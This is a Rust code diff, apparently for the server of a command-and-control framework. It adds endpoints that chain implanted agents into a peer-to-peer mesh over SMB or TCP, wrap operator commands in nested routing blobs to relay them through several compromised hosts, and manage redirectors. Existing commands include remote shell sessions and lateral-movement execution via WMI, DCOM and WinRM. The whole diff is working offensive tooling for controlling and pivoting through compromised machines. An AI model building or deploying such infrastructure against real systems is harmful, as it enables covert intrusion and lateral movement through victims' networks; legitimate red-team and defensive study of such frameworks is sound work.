@@ -64,6 +64,35 @@ pub struct PushModuleRequest {
     pub module_data: String,
 }
 
+#[derive(Deserialize)]
+pub struct LinkAgentsRequest {
+    pub parent_agent_id: String,
+    pub child_agent_id: String,
+    /// Transport to use: `"smb"` or `"tcp"`.
+    pub transport: String,
+    /// Target address for TCP links (host:port).  Ignored for SMB.
+    #[serde(default)]
+    pub target_addr: String,
+}
+
+#[derive(Deserialize)]
+pub struct UnlinkAgentRequest {
+    pub agent_id: String,
+}
+
+#[derive(Serialize)]
+pub struct TopologyReply {
+    pub nodes: Vec<TopologyNodeView>,
+}
+
+#[derive(Serialize)]
+pub struct TopologyNodeView {
+    pub agent_id: String,
+    pub parent: Option<String>,
+    pub children: Vec<String>,
+    pub depth: u32,
+}
+
 pub fn router(state: Arc<AppState>, static_dir: std::path::PathBuf) -> Router {
     // Routes that require the standard `Authorization: Bearer <token>` header.
     let api_authed = Router::new()
@@ -89,16 +118,39 @@ pub fn router(state: Arc<AppState>, static_dir: std::path::PathBuf) -> Router {
         .route("/agents/:id/shell/:sid/input", post(shell_input))
         .route("/agents/:id/shell/:sid/output", get(shell_output))
         .route("/agents/:id/push-module", post(push_module))
+        // P2P mesh management endpoints.
+        .route("/p2p/link", post(link_agents))
+        .route("/p2p/unlink", post(unlink_agent))
+        .route("/p2p/topology", get(list_topology))
+        // Redirector management endpoints (authed for operator use).
+        .route("/redirector/list", get(crate::redirector::handle_list))
+        .route("/redirector/remove", post(crate::redirector::handle_remove))
+        .route("/redirector/register", post(crate::redirector::handle_register))
+        .route(
+            "/redirector/agent-config/:profile",
+            get(crate::redirector::handle_agent_config),
+        )
         .route_layer(middleware::from_fn_with_state(
             state.clone(),
             require_bearer,
         ))
         .with_state(state.clone());
 
+    // Redirector heartbeat endpoint — outside auth because redirectors
+    // use their redirector ID as authentication (not a bearer token).
+    let redirector_public = Router::new()
+        .route(
+            "/redirector/heartbeat",
+            post(crate::redirector::handle_heartbeat),
+        )
+        .with_state(state.clone());
+
     // The WebSocket endpoint authenticates inside the handler because
     // browsers cannot set custom headers on WebSocket upgrade requests;
     // the token is carried in the `Sec-WebSocket-Protocol` header.
-    let api = api_authed.route("/ws", get(ws_handler).with_state(state.clone()));
+    let api = api_authed
+        .route("/ws", get(ws_handler).with_state(state.clone()))
+        .merge(redirector_public);
 
     Router::new()
         .nest("/api", api)
@@ -169,7 +221,7 @@ async fn shell_output(
 /// The signature covers `SHA-256(module_bytes) || module_bytes` so that
 /// the verifier can check both integrity and authenticity in one shot.
 /// Returns `[64-byte Ed25519 signature][module_bytes]`.
-fn sign_module(
+pub fn sign_module(
     signing_key: &ed25519_dalek::SigningKey,
     module_bytes: &[u8],
 ) -> Vec<u8> {
@@ -187,7 +239,7 @@ fn sign_module(
 }
 
 /// Load the Ed25519 signing key from server config (base64-encoded 32-byte seed).
-fn load_signing_key(state: &AppState) -> Result<ed25519_dalek::SigningKey, (StatusCode, String)> {
+pub fn load_signing_key(state: &AppState) -> Result<ed25519_dalek::SigningKey, (StatusCode, String)> {
     let b64 = state
         .config
         .module_signing_key
@@ -206,7 +258,7 @@ fn load_signing_key(state: &AppState) -> Result<ed25519_dalek::SigningKey, (Stat
 }
 
 /// Load the module AES key from server config and build a `CryptoSession`.
-fn load_module_crypto(state: &AppState) -> Result<CryptoSession, (StatusCode, String)> {
+pub fn load_module_crypto(state: &AppState) -> Result<CryptoSession, (StatusCode, String)> {
     let b64 = state
         .config
         .module_aes_key
@@ -286,16 +338,238 @@ async fn push_module(
     }))
 }
 
+// ── P2P mesh management ─────────────────────────────────────────────────
+
+/// `POST /api/p2p/link`
+///
+/// Instruct a child agent to establish a P2P link to a parent agent.
+/// Sends a `LinkAgents` command to the child, which initiates the P2P
+/// connection.
+async fn link_agents(
+    State(state): State<Arc<AppState>>,
+    Extension(user): Extension<AuthenticatedUser>,
+    Json(req): Json<LinkAgentsRequest>,
+) -> Result<Json<CommandReply>, (StatusCode, String)> {
+    // Validate that the parent agent exists (directly connected or via P2P).
+    let parent_entry = state.find_by_agent_id(&req.parent_agent_id);
+    if parent_entry.is_none() {
+        // Check if the parent is reachable via P2P relay.
+        if state.route_to_agent(&req.parent_agent_id).await.is_none() {
+            return Err((
+                StatusCode::NOT_FOUND,
+                format!(
+                    "parent agent '{}' not found (direct or via P2P relay)",
+                    req.parent_agent_id
+                ),
+            ));
+        }
+    }
+
+    // Send the LinkAgents command to the child agent.
+    let cmd_req = CommandRequest {
+        command: Command::LinkAgents {
+            parent_agent_id: req.parent_agent_id.clone(),
+            child_agent_id: req.child_agent_id.clone(),
+            transport: req.transport.clone(),
+            target_addr: req.target_addr.clone(),
+        },
+    };
+
+    let entry = state
+        .find_by_agent_id(&req.child_agent_id)
+        .ok_or((
+            StatusCode::NOT_FOUND,
+            format!(
+                "child agent '{}' must be directly connected to issue LinkAgents",
+                req.child_agent_id
+            ),
+        ))?;
+
+    state.audit.record_simple(
+        &req.child_agent_id,
+        &user.0,
+        "LinkAgents",
+        &format!(
+            "parent={}, child={}, transport={}, addr={}",
+            req.parent_agent_id, req.child_agent_id, req.transport, req.target_addr
+        ),
+        Outcome::Success,
+    );
+
+    dispatch_command(state, user, entry, cmd_req).await
+}
+
+/// `POST /api/p2p/unlink`
+///
+/// Instruct an agent to disconnect from its P2P parent.
+async fn unlink_agent(
+    State(state): State<Arc<AppState>>,
+    Extension(user): Extension<AuthenticatedUser>,
+    Json(req): Json<UnlinkAgentRequest>,
+) -> Result<Json<CommandReply>, (StatusCode, String)> {
+    let cmd_req = CommandRequest {
+        command: Command::UnlinkAgent {
+            agent_id: req.agent_id.clone(),
+        },
+    };
+
+    let entry = state
+        .find_by_agent_id(&req.agent_id)
+        .ok_or((
+            StatusCode::NOT_FOUND,
+            format!(
+                "agent '{}' not found or not directly connected",
+                req.agent_id
+            ),
+        ))?;
+
+    state.audit.record_simple(
+        &req.agent_id,
+        &user.0,
+        "UnlinkAgent",
+        &format!("unlink agent_id={}", req.agent_id),
+        Outcome::Success,
+    );
+
+    dispatch_command(state, user, entry, cmd_req).await
+}
+
+/// `GET /api/p2p/topology`
+///
+/// Return the current P2P mesh topology as seen by the server.
+async fn list_topology(State(state): State<Arc<AppState>>) -> Json<TopologyReply> {
+    let topo = state.topology.read().await;
+    let nodes = topo
+        .nodes
+        .iter()
+        .map(|(agent_id, node)| TopologyNodeView {
+            agent_id: agent_id.clone(),
+            parent: node.parent.clone(),
+            children: node.children.clone(),
+            depth: node.depth,
+        })
+        .collect();
+    Json(TopologyReply { nodes })
+}
+
+// ── Command dispatch ──────────────────────────────────────────────────────
+
 async fn send_command_by_agent_id(
     State(state): State<Arc<AppState>>,
     Extension(user): Extension<AuthenticatedUser>,
     Path(agent_id): Path<String>,
     Json(req): Json<CommandRequest>,
 ) -> Result<Json<CommandReply>, (StatusCode, String)> {
-    let entry = state
-        .find_by_agent_id(&agent_id)
-        .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
-    dispatch_command(state, user, entry, req).await
+    // First, try to find a directly-connected agent.
+    if let Some(entry) = state.find_by_agent_id(&agent_id) {
+        return dispatch_command(state, user, entry, req).await;
+    }
+
+    // Not directly connected — check if the agent is reachable through
+    // the P2P relay chain.
+    let route = state
+        .route_to_agent(&agent_id)
+        .await
+        .ok_or((
+            StatusCode::NOT_FOUND,
+            format!("no agent with agent_id '{agent_id}' (direct or via P2P relay)"),
+        ))?;
+
+    // The route is: [(directly_connected_agent, link_id), ..., (last_parent, link_id)]
+    // Build the routing blob from inside out:
+    //   1. Serialize the command as a TaskRequest message.
+    //   2. Wrap it in layers of P2pToChild from innermost to outermost.
+    let task_id = uuid::Uuid::new_v4().to_string();
+    let cmd_label_str = command_label(&req.command);
+    let inner_msg = Message::TaskRequest {
+        task_id: task_id.clone(),
+        command: req.command,
+        operator_id: Some(user.0.clone()),
+    };
+
+    // Serialize the innermost C2 message.
+    let mut payload = bincode::serialize(&inner_msg)
+        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("serialize: {e}")))?;
+
+    // Wrap in P2P routing blobs from the innermost hop to the outermost.
+    // route = [(hop1_agent, hop1_link), (hop2_agent, hop2_link), ...]
+    // For a 2-hop route [(A, la_b), (B, lb_c)]:
+    //   payload = build_blob(lb_c, serialize(c2_msg))
+    //   Then server sends P2pToChild { la_b, payload }
+    //
+    // For a 3-hop route [(A, la_b), (B, lb_c), (C, lc_d)]:
+    //   payload = build_blob(lc_d, serialize(c2_msg))   // C→D
+    //   payload = build_blob(lb_c, payload)              // B→C
+    //   Then server sends P2pToChild { la_b, payload }
+    //
+    // The last element is the direct child of the target, so we start there
+    // and work backwards, skipping route[0] (the first hop's link_id goes
+    // in the P2pToChild envelope, not in the blob).
+    for (_, link_id) in route.iter().skip(1).rev() {
+        // Build routing blob: [link_id:u32 LE][payload_len:u32 LE][payload]
+        let mut blob = Vec::with_capacity(4 + 4 + payload.len());
+        blob.extend_from_slice(&link_id.to_le_bytes());
+        blob.extend_from_slice(&(payload.len() as u32).to_le_bytes());
+        blob.extend_from_slice(&payload);
+        payload = blob;
+    }
+
+    // Send the outermost P2pToChild to the directly-connected agent.
+    let first_hop_agent_id = route[0].0.clone();
+    let first_hop_entry = state
+        .find_by_agent_id(&first_hop_agent_id)
+        .ok_or((
+            StatusCode::NOT_FOUND,
+            format!(
+                "first-hop agent '{first_hop_agent_id}' is no longer connected"
+            ),
+        ))?;
+
+    let first_link_id = route[0].1;
+    let p2p_msg = Message::P2pToChild {
+        child_link_id: first_link_id,
+        data: payload,
+    };
+
+    if first_hop_entry.tx.send(p2p_msg).await.is_err() {
+        state.audit.record_simple(
+            &agent_id,
+            &user.0,
+            cmd_label_str,
+            "P2P relay send failed — first hop disconnected",
+            Outcome::Failure,
+        );
+        return Err((
+            StatusCode::BAD_GATEWAY,
+            "first-hop agent disconnected".into(),
+        ));
+    }
+
+    state.audit.record_simple(
+        &agent_id,
+        &user.0,
+        cmd_label_str,
+        &format!(
+            "command relayed via P2P chain ({} hops, first={})",
+            route.len(),
+            first_hop_agent_id
+        ),
+        Outcome::Success,
+    );
+
+    // For relayed commands we can't wait for a response (the child's
+    // response would need to traverse the relay chain back).  Return
+    // immediately with a "relayed" status.
+    Ok(Json(CommandReply {
+        task_id,
+        outcome: "relayed",
+        output: Some(format!(
+            "command relayed to '{}' via {} hop(s)",
+            agent_id,
+            route.len()
+        )),
+        error: None,
+    }))
 }
 
 async fn send_command_by_connection_id(
@@ -447,6 +721,12 @@ fn command_label(c: &Command) -> &'static str {
         Command::WmiExec { .. } => "WmiExec",
         Command::DcomExec { .. } => "DcomExec",
         Command::WinRmExec { .. } => "WinRmExec",
+        Command::LinkAgents { .. } => "LinkAgents",
+        Command::UnlinkAgent { .. } => "UnlinkAgent",
+        Command::ListTopology => "ListTopology",
+        Command::LinkTo { .. } => "LinkTo",
+        Command::Unlink { .. } => "Unlink",
+        Command::ListLinks => "ListLinks",
     }
 }
 
